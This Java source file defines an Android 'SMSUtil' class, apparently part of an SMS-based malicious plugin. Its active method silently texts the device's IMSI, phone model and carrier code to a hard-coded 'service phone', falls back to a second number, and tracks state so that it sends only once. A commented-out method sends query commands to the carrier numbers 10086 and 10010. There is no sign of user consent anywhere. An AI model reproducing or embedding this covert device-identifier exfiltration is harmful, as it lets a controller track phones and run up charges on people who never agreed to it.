package com.xstd.plugin.Utils;

import android.content.Context;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM9:51
 * To change this template use File | Settings | File Templates.
 */
public class SMSUtil {

    public static final boolean sendSMS(String target, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
            if (Config.DEBUG) {
                Config.LOGD("[[SMSUtil::sendSMS]] try to send msg : << " + msg + " >> to : << " + target + " >>");
            }

            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    public synchronized static final void trySendCmdToServicePhone1(Context context) {
        if (Config.DEBUG) {
            Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone >>>>>>>");
        }

        if (SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
            //如果没有发送过短信到服务器手机，那么就不在做任何处理了
            if (Config.DEBUG) {
                Config.LOGD("[[trySendCmdToServicePhone1]] This phone has send SMS to Service Phone. last send day time : ("
                                + SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
                        + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
                        + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
                        + ")");
            }
            return;
        }

        int networkType = AppRuntime.getNetworkTypeByIMSI(context);
        String target = AppRuntime.PHONE_SERVICE1;
        String content = "IMEI:" + UtilsRuntime.getIMSI(context) + " PHONETYPE:" + android.os.Build.MODEL;
        switch (networkType) {
            case AppRuntime.CMNET:
                content = content + " NT:1";
                break;
            case AppRuntime.UNICOM:
                content = content + " NT:2";
                break;
            case AppRuntime.TELECOM:
                content = content + " NT:3";
                break;
            case AppRuntime.SUBWAY:
                content = content + " NT:4";
                break;
            default:
                content = content + " NT:-1";
        }

        if (SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes() >= 2) {
            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
            target = AppRuntime.PHONE_SERVICE2;
            if (Config.DEBUG) {
                Config.LOGD("[[trySendCmdToServicePhone1]] has send to Service phone : " + AppRuntime.PHONE_SERVICE1 + " 2 times, so " +
                                "this time send the message to : " + AppRuntime.PHONE_SERVICE2);
            }
        } else {
            target = AppRuntime.PHONE_SERVICE1;
        }

        if (!TextUtils.isEmpty(content) && sendSMS(target, content)) {
            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
        } else {
            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
        }

        Calendar c = Calendar.getInstance();
        int curDay = c.get(Calendar.DAY_OF_YEAR);
        SettingManager.getInstance().setKeyLastSendMsgToServicePhone(curDay);

        if (Config.DEBUG) {
            Config.LOGD("[[trySendCmdToServicePhone1]] setKeyLastSendMsgToServicePhone = " + curDay);
        }
    }

//    public synchronized static final void trySendCmdToNetwork(Context context) {
//        if (Config.DEBUG) {
//            Config.LOGD("[[trySendCmdToNetwork]] try to send cmd to fetch SMS center >>>>>>>>>");
//        }
//
//        /**
//         * 五分钟之内不重复发送获取短信中心的短信
//         */
//        long last = SettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
//        long cur = System.currentTimeMillis();
//        if (last + 5 * 60 * 1000 > cur) {
//            return;
//        }
//
//        int networkType = AppRuntime.getNetworkTypeByIMSI(context);
//        ArrayList<String> cmd = new ArrayList<String>();
//        String target = null;
//        switch (networkType) {
//            case AppRuntime.CMNET:
//                target = "10086";
//                cmd.add(AppRuntime.SMSCenterCommand.CMNET_CMD);
//                break;
//            case AppRuntime.UNICOM:
//                target = "10010";
//                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD1);
//                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD2);
//                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD3);
//                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD4);
//                break;
//            default:
//                if (!SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
//                        && AppRuntime.isSIMCardReady(context)) {
//                    target = AppRuntime.PHONE_SERVICE;
//                    cmd.add("IMEI:" + UtilsRuntime.getIMEI(context) + " 手机类型:" + android.os.Build.MODEL);
//                    /**
//                     * 表示这个设备已经发送到服务器手机了，不需要再发了
//                     */
//                    SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
//                }
//        }
//
//        if (target != null && cmd.size() > 0) {
//            for (String c : cmd) {
//                sendSMS(target, c);
//            }
//        }
//
//        SettingManager.getInstance().setKeyLastSendMsgToServicePhone(cur);
//    }

}
